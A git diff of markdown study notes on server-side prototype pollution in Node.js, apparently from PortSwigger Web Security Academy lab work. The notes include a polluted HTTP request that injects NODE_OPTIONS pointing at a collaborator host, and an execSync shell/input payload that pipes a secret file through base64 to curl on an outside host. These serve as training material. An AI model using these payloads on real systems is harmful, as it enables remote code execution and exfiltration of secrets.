@@ -249,26 +249,19 @@ These are often invoked by a request that occurs asynchronously to the request w
 The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.
 
 ```http
-POST /admin/jobs HTTP/2
+POST /my-account/change-address HTTP/2
 Host: 0ac900b5045ce47b8100e0a9006f00c7.web-security-academy.net
 
-{
-	"csrf":"8KO2mfQGK1CezXWQZRUGm0UVbcd5p2iT",
-	"sessionId":"PgXrYzDZezD6GUEqC1VNodlsViDq8us4",
-	"tasks":[
-		"db-cleanup",
-		"fs-cleanup"
-	],
-	"__proto__":{
-		"shell":"node",
-		"NODE_OPTIONS":"--inspect=zhkjs2rzq28n1hphskf1d9qpigo7cx0m.oastify.com\"\".oastify\"\".com"
-	}
-}
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UKs","sessionId":"bAIJlRdG9dLFl39CLXBTLsZ5qRwAjxB4","__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=68c9em67d9tkezyaarw94l0r9if930rp.oastify.com\"\".oastify\"\".com"}}
+
+
+200 OK
+{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UKs","__prototype__":{"space":"         ","foo":"bar"},"isAdmin":true,"foo":"bar","shell":"node","NODE_OPTIONS":"--inspect=68c9em67d9tkezyaarw94l0r9if930rp.oastify.com\"\".oastify\"\".com"}
 ```
 
 ### Remote code execution via `child_process.fork()`
 
-Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing **command-line arguments** that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.
+Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing **command-line arguments** that should be used when spawning the child process. **If it's left undefined by the developers**, this potentially also means it can be controlled via prototype pollution.
 
 ```json
 "execArgv": [
@@ -286,7 +279,9 @@ In addition to `fork()`, the `child_process` module contains the `execSync()
 }
 ```
 
-### Remote code execution via `child_process.execSync()`
+### Remote code execution via already defined `child_process.execSync()`
+
+In some cases, the application may invoke `child_process.execSync()` of its own accord in order to execute system commands. In this case we can try to pollute options used by this method.
 
 The `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an `execArgv` property, you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:
 
@@ -297,6 +292,17 @@ By polluting both of these properties, you may be able to override the command t
 
 >[!warning]
 >The `shell` is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
+>
+>One additional limitation of this technique is that some tools that you might want to use for your exploit also don't read data from `stdin` by default. However, there are a few simple ways around this. In the case of `curl`, for example, you can read `stdin` and send the contents as the body of a `POST` request using the `-d @-` argument.
+>
+>In other cases, you can use `xargs`, which converts `stdin` to a list of arguments that can be passed to a command.
+
+Example:
+```json
+"shell":"vim",
+"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
+```
+
 
 ### Remote code execution via `import`
 
